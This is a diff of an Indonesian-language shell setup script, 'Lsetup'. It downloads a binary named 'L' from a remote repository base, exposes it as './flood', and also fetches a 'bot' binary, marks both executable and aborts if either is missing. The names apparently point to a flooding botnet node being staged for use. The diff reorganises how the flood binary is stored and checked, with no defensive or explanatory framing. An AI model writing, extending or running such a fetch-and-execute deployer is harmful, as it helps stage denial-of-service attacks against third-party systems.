@@ -28,21 +28,28 @@ echo "=================================================="
 echo "            Initializing Lsetup                   "
 echo "=================================================="
 
-# ---- biner L (flood) ----
+# ---- biner L (disimpan sebagai ./L + symlink ./flood) ----
 L_OK=0
 if [ -f "${SCRIPT_DIR}/L" ]; then
     echo "[*] Menggunakan biner L lokal..."
-    cp -f "${SCRIPT_DIR}/L" "./flood"
+    cp -f "${SCRIPT_DIR}/L" "./L"
     L_OK=1
 else
     echo "[*] Download biner L..."
-    if download_file "${REPO_BASE}/Lsetup/L" "./flood" && [ -s "./flood" ]; then
+    if download_file "${REPO_BASE}/Lsetup/L" "./L" && [ -s "./L" ]; then
         L_OK=1
     fi
 fi
 
+chmod +x "./L" 2>/dev/null || true
+ln -sf "./L" "./flood" 2>/dev/null || cp -f "./L" "./flood"
 chmod +x "./flood" 2>/dev/null || true
-echo "[+] Biner L siap: $(ls -la ./flood | awk '{print $5}') bytes"
+echo "[+] Biner L siap: $(ls -la ./L | awk '{print $5}') bytes"
+
+if [ ! -x ./L ]; then
+    echo "[!] biner L gagal didapat. Aborting."
+    exit 1
+fi
 
 # ---- bot biner ----
 BOT_OK=0
@@ -58,10 +65,6 @@ else
 fi
 chmod +x "./bot" 2>/dev/null || true
 
-if [ ! -x ./flood ]; then
-    echo "[!] biner L gagal didapat. Aborting."
-    exit 1
-fi
 if [ ! -x ./bot ]; then
     echo "[!] biner bot gagal didapat. Aborting."
     exit 1
